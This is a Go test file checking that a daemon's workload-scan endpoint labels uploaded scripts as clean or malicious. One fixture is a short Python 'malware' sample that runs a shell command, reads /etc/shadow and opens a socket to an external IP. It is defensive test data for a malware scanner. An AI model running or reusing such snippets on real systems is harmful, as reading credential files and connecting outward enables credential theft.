package daemon

import (
	"bytes"
	"encoding/json"
	"net/http"
	"net/http/httptest"
	"os"
	"path/filepath"
	"testing"
)

func TestWorkloadScanEndpointClassifiesUploads(t *testing.T) {
	server, err := NewDaemonServer(filepath.Join(t.TempDir(), "audit.jsonl"))
	if err != nil {
		t.Fatalf("failed to create daemon server: %v", err)
	}
	handler := server.SetupRoutes()

	tests := []struct {
		name      string
		fileName  string
		content   string
		malicious bool
	}{
		{
			name:      "clean script",
			fileName:  "normal.py",
			content:   `print("safe")`,
			malicious: false,
		},
		{
			name:     "malware script",
			fileName: "upload.py",
			content: `
import os, socket
os.system("/bin/sh -c whoami")
open("/etc/shadow").read()
socket.socket().connect(("185.220.101.5", 443))
`,
			malicious: true,
		},
		{
			name:      "demo malware script",
			fileName:  "malware.py",
			content:   readTestFile(t, filepath.Join("..", "..", "demo", "malware.py")),
			malicious: true,
		},
	}

	for _, test := range tests {
		t.Run(test.name, func(t *testing.T) {
			body, err := json.Marshal(map[string]string{
				"file_name":    test.fileName,
				"code_content": test.content,
			})
			if err != nil {
				t.Fatalf("failed to marshal request: %v", err)
			}

			req := httptest.NewRequest(http.MethodPost, "/api/workload/scan", bytes.NewReader(body))
			req.Header.Set("Content-Type", "application/json")
			rec := httptest.NewRecorder()
			handler.ServeHTTP(rec, req)

			if rec.Code != http.StatusOK {
				t.Fatalf("expected status 200, got %d: %s", rec.Code, rec.Body.String())
			}

			var result struct {
				Malicious bool `json:"malicious"`
			}
			if err := json.NewDecoder(rec.Body).Decode(&result); err != nil {
				t.Fatalf("failed to decode response: %v", err)
			}
			if result.Malicious != test.malicious {
				t.Fatalf("expected malicious=%v, got %v", test.malicious, result.Malicious)
			}
		})
	}
}

func readTestFile(t *testing.T, path string) string {
	t.Helper()

	data, err := os.ReadFile(path)
	if err != nil {
		t.Fatalf("failed to read test file %s: %v", path, err)
	}
	return string(data)
}
